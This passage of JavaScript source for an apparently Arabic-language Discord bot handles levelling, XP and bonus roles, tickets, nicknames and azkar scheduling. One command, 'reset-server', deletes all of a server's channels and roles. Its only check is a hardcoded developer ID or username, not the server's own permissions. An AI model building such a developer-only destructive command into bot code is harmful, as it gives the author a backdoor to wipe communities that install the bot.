        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "id") {
        const targetUser = interaction.options.getUser("user") || user;
        const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
        if (!targetMember) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631.", ephemeral: true });
        }
        await interaction.deferReply();
        try {
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
          const level = userRow?.level || 0;
          const xp = userRow?.xp || 0;
          const nextLevelXp = (level + 1) * 300;
          const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId);
          const rank = leaderboard.findIndex((u) => u.userId === targetUser.id) + 1;
          const width = 800;
          const height = 300;
          const canvas = createCanvas(width, height);
          const ctx = canvas.getContext("2d");
          const avatarURL = targetUser.displayAvatarURL({ extension: "png", size: 256 });
          const avatar = await loadImage(avatarURL);
          const encoder = new GIFEncoder(width, height);
          encoder.start();
          encoder.setRepeat(0);
          encoder.setDelay(50);
          encoder.setQuality(10);
          const totalFrames = 20;
          const targetProgress = Math.min(xp / nextLevelXp, 1);
          for (let i = 0; i <= totalFrames; i++) {
            const currentProgress = i / totalFrames * targetProgress;
            ctx.clearRect(0, 0, width, height);
            const bgGradient = ctx.createLinearGradient(0, 0, width, height);
            bgGradient.addColorStop(0, "#1a1a2e");
            bgGradient.addColorStop(1, "#16213e");
            ctx.fillStyle = bgGradient;
            ctx.fillRect(0, 0, width, height);
            ctx.save();
            ctx.globalAlpha = 0.1;
            ctx.fillStyle = "#5865f2";
            ctx.beginPath();
            ctx.arc(width, 0, 200, 0, Math.PI * 2);
            ctx.fill();
            ctx.beginPath();
            ctx.arc(0, height, 150, 0, Math.PI * 2);
            ctx.fill();
            ctx.restore();
            ctx.save();
            ctx.fillStyle = "rgba(255, 255, 255, 0.05)";
            ctx.beginPath();
            ctx.roundRect(30, 30, width - 60, height - 60, 25);
            ctx.fill();
            ctx.strokeStyle = "rgba(255, 255, 255, 0.1)";
            ctx.lineWidth = 1;
            ctx.stroke();
            ctx.restore();
            ctx.save();
            ctx.shadowBlur = 20;
            ctx.shadowColor = "#5865f2";
            ctx.beginPath();
            ctx.arc(130, 150, 80, 0, Math.PI * 2);
            ctx.fillStyle = "#5865f2";
            ctx.globalAlpha = 0.2;
            ctx.fill();
            ctx.restore();
            ctx.save();
            ctx.beginPath();
            ctx.arc(130, 150, 75, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.clip();
            ctx.drawImage(avatar, 55, 75, 150, 150);
            ctx.restore();
            ctx.strokeStyle = "#5865f2";
            ctx.lineWidth = 4;
            ctx.beginPath();
            ctx.arc(130, 150, 75, 0, Math.PI * 2, true);
            ctx.stroke();
            ctx.font = "bold 38px sans-serif";
            ctx.fillStyle = "#ffffff";
            ctx.textAlign = "left";
            ctx.fillText(targetUser.username, 240, 95);
            const drawStat = (x, y, label, value, color) => {
              ctx.font = "14px sans-serif";
              ctx.fillStyle = "rgba(255, 255, 255, 0.5)";
              ctx.fillText(label, x, y);
              ctx.font = "bold 24px sans-serif";
              ctx.fillStyle = color;
              ctx.fillText(value, x, y + 30);
            };
            drawStat(240, 130, "LEVEL", level.toString(), "#5865f2");
            drawStat(360, 130, "RANK", `#${rank}`, "#00d2ff");
            drawStat(480, 130, "PROGRESS", `${Math.floor(currentProgress * 100)}%`, "#ff007a");
            const barWidth = 500;
            const barHeight = 30;
            const barX = 240;
            const barY = 195;
            ctx.fillStyle = "rgba(255, 255, 255, 0.1)";
            ctx.beginPath();
            ctx.roundRect(barX, barY, barWidth, barHeight, 15);
            ctx.fill();
            if (currentProgress > 0) {
              const barGrad = ctx.createLinearGradient(barX, 0, barX + barWidth, 0);
              barGrad.addColorStop(0, "#5865f2");
              barGrad.addColorStop(1, "#ff007a");
              ctx.fillStyle = barGrad;
              ctx.beginPath();
              ctx.roundRect(barX, barY, barWidth * currentProgress, barHeight, 15);
              ctx.fill();
            }
            ctx.font = "bold 14px sans-serif";
            ctx.fillStyle = "#ffffff";
            ctx.textAlign = "center";
            ctx.fillText(`${xp} / ${nextLevelXp} XP`, barX + barWidth / 2, barY + 20);
            encoder.addFrame(ctx);
          }
          for (let i = 0; i < 15; i++) encoder.addFrame(ctx);
          encoder.finish();
          const buffer = encoder.out.getData();
          const attachment = new AttachmentBuilder(buffer, { name: "profile-card.gif" });
          await interaction.editReply({ files: [attachment] });
        } catch (err) {
          console.error("Error generating ID image:", err);
          await interaction.editReply("\u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u0625\u0646\u0634\u0627\u0621 \u0635\u0648\u0631\u0629 \u0627\u0644\u0647\u0648\u064A\u0629 \u0627\u0644\u0645\u062A\u062D\u0631\u0643\u0629.");
        }
      }
      if (commandName === "bonus") {
        const userRow = db.prepare("SELECT bonus FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId);
        const currentBonus = userRow?.bonus || 0;
        const currentHour = (/* @__PURE__ */ new Date()).getHours();
        const isHappyHour = currentHour >= HAPPY_HOUR_START && currentHour < HAPPY_HOUR_END;
        const isBonusChannel = BONUS_CHANNELS.includes(channel?.id || "");
        let multiplier = 1;
        if (isHappyHour) multiplier *= 2;
        if (isBonusChannel) multiplier *= 2;
        const embed = new EmbedBuilder().setTitle("\u0646\u0638\u0627\u0645 \u0627\u0644\u0640 Bonus \u0648 XP").setDescription(`\u0631\u0635\u064A\u062F\u0643 \u0627\u0644\u062D\u0627\u0644\u064A \u0645\u0646 \u0627\u0644\u0640 **Bonus**: \`${currentBonus}\``).addFields(
          { name: "Happy Hour", value: isHappyHour ? "\u2705 Active (2x XP)" : "\u274C Inactive (6 PM - 8 PM)", inline: true },
          { name: "Channel Bonus", value: isBonusChannel ? "\u2705 Active (2x XP)" : "\u274C Inactive in this channel", inline: true },
          { name: "Total Multiplier", value: `${multiplier}x`, inline: false }
        ).setFooter({ text: "\u062A\u062D\u0635\u0644 \u0639\u0644\u0649 \u062A\u0631\u0642\u064A\u0629 \u062A\u0644\u0642\u0627\u0626\u064A\u0629 \u0639\u0646\u062F \u0648\u0635\u0648\u0644\u0643 \u0644\u0640 20 bonus" }).setColor(multiplier > 1 ? 65280 : 5793266);
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "rewards") {
        const embed = new EmbedBuilder().setTitle("Level Role Rewards").setDescription("Reach these levels to unlock exclusive roles!").setColor(5793266);
        const dynamicRewards = db.prepare("SELECT level, roleId FROM rewards WHERE guildId = ?").all(guildId);
        const dynamicRewardMap = new Map(dynamicRewards.map((r) => [r.level, r.roleId]));
        const allLevels = Array.from(/* @__PURE__ */ new Set([...Object.keys(LEVEL_ROLES).map(Number), ...dynamicRewardMap.keys()])).sort((a, b) => a - b);
        const rewardList = allLevels.map((lvl) => {
          const roleId = dynamicRewardMap.get(lvl) || LEVEL_ROLES[lvl];
          return `Level **${lvl}**: <@&${roleId}>`;
        }).join("\n") || "No rewards configured yet.";
        embed.addFields({ name: "Available Rewards", value: rewardList });
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "nick") {
        const targetMember = interaction.options.getMember("user") || interaction.member;
        const newNick = interaction.options.getString("name");
        if (targetMember.id !== user.id && !interaction.memberPermissions?.has(PermissionFlagsBits.ManageNicknames)) {
          return interaction.reply({ content: "\u274C \u0644\u064A\u0633 \u0644\u062F\u064A\u0643 \u0635\u0644\u0627\u062D\u064A\u0629 \u062A\u063A\u064A\u064A\u0631 \u0623\u0633\u0645\u0627\u0621 \u0627\u0644\u0622\u062E\u0631\u064A\u0646.", ephemeral: true });
        }
        if (!guild.members.me?.permissions.has(PermissionFlagsBits.ManageNicknames)) {
          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u0644\u0627 \u064A\u0645\u0644\u0643 \u0635\u0644\u0627\u062D\u064A\u0629 \u062A\u063A\u064A\u064A\u0631 \u0627\u0644\u0623\u0633\u0645\u0627\u0621.", ephemeral: true });
        }
        if (targetMember.id !== guild.ownerId && targetMember.roles.highest.position >= guild.members.me.roles.highest.position) {
          return interaction.reply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646\u0646\u064A \u062A\u063A\u064A\u064A\u0631 \u0627\u0633\u0645 \u0647\u0630\u0627 \u0627\u0644\u0634\u062E\u0635 \u0628\u0633\u0628\u0628 \u0627\u0644\u0631\u062A\u0628.", ephemeral: true });
        }
        try {
          await targetMember.setNickname(newNick);
          await interaction.reply({ content: newNick ? `\u2705 \u062A\u0645 \u062A\u063A\u064A\u064A\u0631 \u0627\u0633\u0645 ${targetMember.user.username} \u0625\u0644\u0649 **${newNick}**` : `\u2705 \u062A\u0645 \u0625\u0632\u0627\u0644\u0629 \u0627\u0644\u0627\u0633\u0645 \u0627\u0644\u0645\u0633\u062A\u0639\u0627\u0631 \u0644\u0640 ${targetMember.user.username}` });
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u0645\u062D\u0627\u0648\u0644\u0629 \u062A\u063A\u064A\u064A\u0631 \u0627\u0644\u0627\u0633\u0645.", ephemeral: true });
        }
      }
      if (commandName === "clear") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.ManageMessages)) {
          return interaction.reply({ content: "You need 'Manage Messages' permission.", ephemeral: true });
        }
        if (!guild.members.me?.permissions.has(PermissionFlagsBits.ManageMessages)) {
          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 \u062D\u0630\u0641 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 (Manage Messages).", ephemeral: true });
        }
        const amount = interaction.options.getInteger("amount");
        if (amount < 1 || amount > 100) return interaction.reply({ content: "Please provide a number between 1 and 100.", ephemeral: true });
        try {
          const deleted = await channel.bulkDelete(amount, true);
          await interaction.reply({ content: `\u2705 Deleted ${deleted.size} messages.`, ephemeral: true });
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "Failed to clear messages.", ephemeral: true });
        }
      }
      if (commandName === "setup-ticket") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "You need Administrator permissions.", ephemeral: true });
        }
        const role = interaction.options.getRole("role");
        db.prepare("INSERT INTO ticket_settings (guildId, supportRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET supportRoleId = excluded.supportRoleId").run(guild.id, role.id);
        const embed = new EmbedBuilder().setTitle("Support Tickets").setDescription("Click the button below to open a support ticket.").setColor(5793266);
        const button = new ButtonBuilder().setCustomId("open_ticket").setLabel("Open Ticket").setStyle(ButtonStyle.Primary).setEmoji("\u{1F3AB}");
        const row = new ActionRowBuilder().addComponents(button);
        const botMember = guild.members.me;
        if (!botMember?.permissionsIn(interaction.channelId).has([PermissionFlagsBits.SendMessages, PermissionFlagsBits.EmbedLinks])) {
          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 \u0623\u0648 \u0627\u0644\u0631\u0648\u0627\u0628\u0637 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0631\u0648\u0645.", ephemeral: true });
        }
        await interaction.channel?.send({ embeds: [embed], components: [row] });
        await interaction.reply({ content: `Ticket setup sent! Support role set to ${role}.`, ephemeral: true });
      }
      if (commandName === "reset-server") {
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        if (user.id !== authorizedId && user.username !== authorizedUsername) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
        const botMember = guild.members.me;
        if (!botMember?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0627\u0644\u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0644\u0627\u0632\u0645\u0629 (\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0642\u0646\u0648\u0627\u062A\u060C \u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628).", ephemeral: true });
        }
        await interaction.deferReply();
        await interaction.editReply("\u26A0\uFE0F \u062C\u0627\u0631\u064A \u0627\u0644\u0628\u062F\u0621 \u0641\u064A \u0625\u0639\u0627\u062F\u0629 \u062A\u0639\u064A\u064A\u0646 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 (\u0627\u0644\u0631\u0648\u0645\u0627\u062A\u060C \u0648\u0627\u0644\u0631\u062A\u0628)...");
        try {
          const channels = await guild.channels.fetch();
          console.log(`[RESET] Deleting ${channels.size} channels...`);
          for (const ch of channels.values()) {
            if (ch && ch.deletable) {
              ch.delete("Server Reset").catch((err) => {
                if (err.code === 50013) console.warn(`[RESET] Missing Permissions to delete channel ${ch.name}`);
                else console.error(`Failed to delete channel ${ch.name}:`, err.message);
              });
            }
          }
        } catch (err) {
          console.error("Error fetching channels for reset:", err);
        }
        try {
          const roles = await guild.roles.fetch();
          console.log(`[RESET] Deleting ${roles.size} roles...`);
          for (const role of roles.values()) {
            if (role.name !== "@everyone" && !role.managed && role.editable && role.id !== guild.id) {
              role.delete("Server Reset").catch((err) => {
                if (err.code === 50013) console.warn(`[RESET] Missing Permissions to delete role ${role.name}`);
                else console.error(`Failed to delete role ${role.name}:`, err.message);
              });
            }
          }
        } catch (err) {
          console.error("Error fetching roles for reset:", err);
        }
        setTimeout(async () => {
          try {
            if (botMember?.permissions.has(PermissionFlagsBits.ManageChannels)) {
              const newChannel = await guild.channels.create({
                name: "welcome",
                type: ChannelType.GuildText,
                topic: "Server has been reset."
              });
              await newChannel.send("\u2705 \u062A\u0645 \u062A\u0635\u0641\u064A\u0631 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u062C\u0627\u062D (\u0627\u0644\u0631\u0648\u0645\u0627\u062A\u060C \u0648\u0627\u0644\u0631\u062A\u0628).");
            }
          } catch (e) {
            console.error("Failed to create welcome channel after reset:", e);
          }
        }, 8e3);
      }
      if (commandName === "setxp") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const target = interaction.options.getUser("user");
        const amount = interaction.options.getInteger("amount");
        const level = Math.floor(amount / 300);
        db.prepare("INSERT OR REPLACE INTO leveling (userId, guildId, xp, level) VALUES (?, ?, ?, ?)").run(target.id, guildId, amount, level);
        await interaction.reply(`\u2705 Set ${target}'s XP to **${amount}** (Level ${level}) in this server.`);
      }
      if (commandName === "set-reward") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const level = interaction.options.getInteger("level");
        const role = interaction.options.getRole("role");
        db.prepare("INSERT OR REPLACE INTO rewards (guildId, level, roleId) VALUES (?, ?, ?)").run(guildId, level, role.id);
        await interaction.reply(`\u2705 Reward set: Level **${level}** -> <@&${role.id}>`);
      }
      if (commandName === "set-prefix") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const newPrefix = interaction.options.getString("prefix");
        db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run(`prefix_${guildId}`, newPrefix);
        await interaction.reply(`\u2705 Prefix updated to: \`${newPrefix}\``);
      }
      if (commandName === "set-level") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const ch = interaction.options.getChannel("channel");
        const message = interaction.options.getString("message");
        const status = interaction.options.getString("status");
        if (ch) {
          if (ch.type !== ChannelType.GuildText) return interaction.reply({ content: "Must be a text channel.", ephemeral: true });
          db.prepare("INSERT INTO leveling_settings (guildId, channelId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET channelId = excluded.channelId").run(guildId, ch.id);
        }
        if (message) {
          db.prepare("INSERT INTO leveling_settings (guildId, message) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET message = excluded.message").run(guildId, message);
        }
        if (status) {
          const enabled = status === "on" ? 1 : 0;
          db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
        }
        await interaction.reply(`\u2705 \u062A\u0645 \u062A\u062D\u062F\u064A\u062B \u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u0644\u0641\u0644 \u0628\u0646\u062C\u0627\u062D.`);
      }
      if (commandName === "azkar-setup") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const channel2 = interaction.options.getChannel("channel");
        const interval = interaction.options.getInteger("interval");
        const status = interaction.options.getString("status");
        const enabled = status === "on" ? 1 : 0;
        if (channel2.type !== ChannelType.GuildText) {
          return interaction.reply({ content: "\u064A\u062C\u0628 \u0627\u062E\u062A\u064A\u0627\u0631 \u0642\u0646\u0627\u0629 \u0646\u0635\u064A\u0629.", ephemeral: true });
        }
        db.prepare("INSERT INTO azkar_settings (guildId, channelId, interval, enabled) VALUES (?, ?, ?, ?) ON CONFLICT(guildId) DO UPDATE SET channelId = excluded.channelId, interval = excluded.interval, enabled = excluded.enabled").run(guildId, channel2.id, interval, enabled);
        await interaction.reply(`\u2705 \u062A\u0645 \u0625\u0639\u062F\u0627\u062F \u0646\u0638\u0627\u0645 \u0627\u0644\u0623\u0630\u0643\u0627\u0631 \u0628\u0646\u062C\u0627\u062D!
\u0627\u0644\u0642\u0646\u0627\u0629: ${channel2}
\u0627\u0644\u0645\u062F\u0629: \u0643\u0644 ${interval} \u062F\u0642\u064A\u0642\u0629
\u0627\u0644\u062D\u0627\u0644\u0629: ${status === "on" ? "\u0645\u0641\u0639\u0644" : "\u0645\u0639\u0637\u0644"}`);
      }
      if (commandName === "azkar-add") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const content = interaction.options.getString("content");
        db.prepare("INSERT INTO custom_azkar (guildId, content) VALUES (?, ?)").run(guildId, content);
        await interaction.reply(`\u2705 \u062A\u0645 \u0625\u0636\u0627\u0641\u0629 \u0627\u0644\u0630\u0643\u0631 \u0628\u0646\u062C\u0627\u062D: **${content}**`);
      }
      if (commandName === "azkar-list") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const customAzkar = db.prepare("SELECT * FROM custom_azkar WHERE guildId = ?").all(guildId);
        if (customAzkar.length === 0) {
          return interaction.reply({ content: "\u0644\u0627 \u062A\u0648\u062C\u062F \u0623\u0630\u0643\u0627\u0631 \u0645\u062E\u0635\u0635\u0629 \u062D\u0627\u0644\u064A\u0627\u064B.", ephemeral: true });
        }
        const list = customAzkar.map((a) => `**#${a.id}**: ${a.content}`).join("\n");
        const embed = new EmbedBuilder().setTitle("\u{1F4DC} \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0630\u0643\u0627\u0631 \u0627\u0644\u0645\u062E\u0635\u0635\u0629").setDescription(list).setColor(5793266);
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "azkar-remove") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const id = interaction.options.getInteger("id");
        const result = db.prepare("DELETE FROM custom_azkar WHERE id = ? AND guildId = ?").run(id, guildId);
        if (result.changes > 0) {
          await interaction.reply(`\u2705 \u062A\u0645 \u062D\u0630\u0641 \u0627\u0644\u0630\u0643\u0631 \u0631\u0642\u0645 **#${id}** \u0628\u0646\u062C\u0627\u062D.`);
        } else {
          await interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0630\u0643\u0631 \u0628\u0647\u0630\u0627 \u0627\u0644\u0631\u0642\u0645.", ephemeral: true });
        }
      }
      if (commandName === "add-bonus") {
        const authorizedRole = "1484100584054325269";
        const member = interaction.member;
        if (!member.roles.cache.has(authorizedRole) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0639\u0630\u0631\u0627\u064B\u060C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0645\u062E\u0635\u0635 \u0644\u0623\u0635\u062D\u0627\u0628 \u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u0645\u062D\u062F\u062F\u0629 \u0641\u0642\u0637.", ephemeral: true });
        }
        const target = interaction.options.getUser("user");
        const amount = interaction.options.getInteger("amount");
        if (amount <= 0) return interaction.reply({ content: "\u274C \u064A\u062C\u0628 \u0623\u0646 \u062A\u0643\u0648\u0646 \u0627\u0644\u0643\u0645\u064A\u0629 \u0623\u0643\u0628\u0631 \u0645\u0646 \u0635\u0641\u0631.", ephemeral: true });
        db.prepare("INSERT INTO leveling (userId, guildId, bonus) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET bonus = bonus + ?").run(target.id, guildId, amount, amount);
        await interaction.reply(`\u2705 \u062A\u0645 \u0625\u0636\u0627\u0641\u0629 **${amount}** \u0628\u0648\u0646\u064A\u0633 \u0644\u0640 ${target}.`);
        await checkBonusRoles(guildId, target.id);
      }
      if (commandName === "remove-bonus") {
        const authorizedRole = "1484100584054325269";
        const member = interaction.member;
        if (!member.roles.cache.has(authorizedRole) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0639\u0630\u0631\u0627\u064B\u060C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0645\u062E\u0635\u0635 \u0644\u0623\u0635\u062D\u0627\u0628 \u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u0645\u062D\u062F\u062F\u0629 \u0641\u0642\u0637.", ephemeral: true });
        }
        const target = interaction.options.getUser("user");
        const amount = interaction.options.getInteger("amount");
        if (amount <= 0) return interaction.reply({ content: "\u274C \u064A\u062C\u0628 \u0623\u0646 \u062A\u0643\u0648\u0646 \u0627\u0644\u0643\u0645\u064A\u0629 \u0623\u0643\u0628\u0631 \u0645\u0646 \u0635\u0641\u0631.", ephemeral: true });
        db.prepare("INSERT INTO leveling (userId, guildId, bonus) VALUES (?, ?, 0) ON CONFLICT(userId, guildId) DO UPDATE SET bonus = MAX(0, bonus - ?)").run(target.id, guildId, amount);
        await interaction.reply(`\u2705 \u062A\u0645 \u0633\u062D\u0628 **${amount}** \u0628\u0648\u0646\u064A\u0633 \u0645\u0646 ${target}.`);
        await checkBonusRoles(guildId, target.id);
      }
      if (commandName === "set-bonus") {
        const authorizedRole = "1484100584054325269";
        const member = interaction.member;
        if (!member.roles.cache.has(authorizedRole) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0639\u0630\u0631\u0627\u064B\u060C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0645\u062E\u0635\u0635 \u0644\u0623\u0635\u062D\u0627\u0628 \u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u0645\u062D\u062F\u062F\u0629 \u0641\u0642\u0637.", ephemeral: true });
        }
        const target = interaction.options.getUser("user");
        const amount = interaction.options.getInteger("amount");
        if (amount < 0) return interaction.reply({ content: "\u274C \u064A\u062C\u0628 \u0623\u0646 \u062A\u0643\u0648\u0646 \u0627\u0644\u0643\u0645\u064A\u0629 \u0635\u0641\u0631 \u0623\u0648 \u0623\u0643\u062B\u0631.", ephemeral: true });
        db.prepare("INSERT INTO leveling (userId, guildId, bonus) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET bonus = ?").run(target.id, guildId, amount, amount);
        await interaction.reply(`\u2705 \u062A\u0645 \u062A\u062D\u062F\u064A\u062F \u0628\u0648\u0646\u064A\u0633 ${target} \u0628\u0640 **${amount}**.`);
        await checkBonusRoles(guildId, target.id);
      }
      if (commandName === "bonus-role-add") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const role = interaction.options.getRole("role");
        db.prepare("INSERT OR REPLACE INTO bonus_roles (guildId, roleId) VALUES (?, ?)").run(guildId, role.id);
        await interaction.reply(`\u2705 \u062A\u0645 \u0625\u0636\u0627\u0641\u0629 \u0627\u0644\u0631\u062A\u0628\u0629 ${role} \u0625\u0644\u0649 \u0646\u0638\u0627\u0645 \u0627\u0644\u062A\u0631\u0642\u064A\u0629 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629 \u0628\u0627\u0644\u0628\u0648\u0646\u064A\u0633.`);
      }
      if (commandName === "bonus-role-remove") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const role = interaction.options.getRole("role");
        const result = db.prepare("DELETE FROM bonus_roles WHERE guildId = ? AND roleId = ?").run(guildId, role.id);
        if (result.changes > 0) {
          await interaction.reply(`\u2705 \u062A\u0645 \u0625\u0632\u0627\u0644\u0629 \u0627\u0644\u0631\u062A\u0628\u0629 ${role} \u0645\u0646 \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u062A\u0631\u0642\u064A\u0629 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629.`);
        } else {
          await interaction.reply({ content: "\u274C \u0647\u0630\u0647 \u0627\u0644\u0631\u062A\u0628\u0629 \u0644\u064A\u0633\u062A \u0641\u064A \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u062A\u0631\u0642\u064A\u0629 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629.", ephemeral: true });
        }
      }
      if (commandName === "bonus-role-list") {
        const settings = db.prepare("SELECT maxRoleId, excludedRoleIds, baseRoleId FROM bonus_role_settings WHERE guildId = ?").get(guildId);
        const excludedRoleIds = settings?.excludedRoleIds ? settings.excludedRoleIds.split(",").map((id) => id.trim()) : [];
        const maxRoleId = settings?.maxRoleId;
        const baseRoleId = settings?.baseRoleId;
        let systemRoles = [];
        if (baseRoleId && maxRoleId) {
          const baseRole = interaction.guild?.roles.cache.get(baseRoleId);
          const maxRole = interaction.guild?.roles.cache.get(maxRoleId);
          if (baseRole && maxRole) {
            systemRoles = interaction.guild.roles.cache.filter((r) => r.position > baseRole.position && r.position <= maxRole.position && !excludedRoleIds.includes(r.id)).sort((a, b) => a.position - b.position).map((r) => r);
          }
        }
        if (systemRoles.length === 0) {
          const roles = db.prepare("SELECT roleId FROM bonus_roles WHERE guildId = ?").all(guildId);
          systemRoles = roles.map((r) => interaction.guild?.roles.cache.get(r.roleId)).filter((r) => r !== void 0 && !excludedRoleIds.includes(r.id)).sort((a, b) => a.position - b.position);
        }
        if (systemRoles.length === 0) {
          return interaction.reply({ content: "\u0644\u0627 \u062A\u0648\u062C\u062F \u0631\u062A\u0628 \u062A\u0631\u0642\u064A\u0629 \u062A\u0644\u0642\u0627\u0626\u064A\u0629 \u0645\u0636\u0627\u0641\u0629 \u062D\u0627\u0644\u064A\u0627\u064B.", ephemeral: true });
        }
        const list = systemRoles.map((r, i) => `${i + 1}. <@&${r.id}>`).join("\n");
        const embed = new EmbedBuilder().setTitle("\u{1F3C6} \u0646\u0638\u0627\u0645 \u0627\u0644\u062A\u0631\u0642\u064A\u0629 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629 (Bonus)").setDescription(`\u064A\u062A\u0645 \u0627\u0644\u062A\u0631\u0642\u064A\u0629 \u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B \u0639\u0646\u062F \u062C\u0645\u0639 **20 bonus**.

**\u062A\u0631\u062A\u064A\u0628 \u0627\u0644\u0631\u062A\u0628:**
${list}`).setColor(65280);
        if (baseRoleId) {
          embed.addFields({ name: "\u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u0623\u0633\u0627\u0633\u064A\u0629 \u0627\u0644\u0645\u0637\u0644\u0648\u0628\u0629", value: `<@&${baseRoleId}>`, inline: true });
        }
        if (maxRoleId) {
          embed.addFields({ name: "\u0623\u0639\u0644\u0649 \u0631\u062A\u0628\u0629 (\u0627\u0644\u0633\u0642\u0641)", value: `<@&${maxRoleId}>`, inline: true });
        }
        if (excludedRoleIds.length > 0) {
          const excluded = excludedRoleIds.map((id) => `<@&${id}>`).join(", ");
          embed.addFields({ name: "\u0627\u0644\u0631\u062A\u0628 \u0627\u0644\u0645\u0633\u062A\u0628\u0639\u062F\u0629 (\u062A\u062E\u0637\u064A)", value: excluded });
        }
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "bonus-role-settings") {
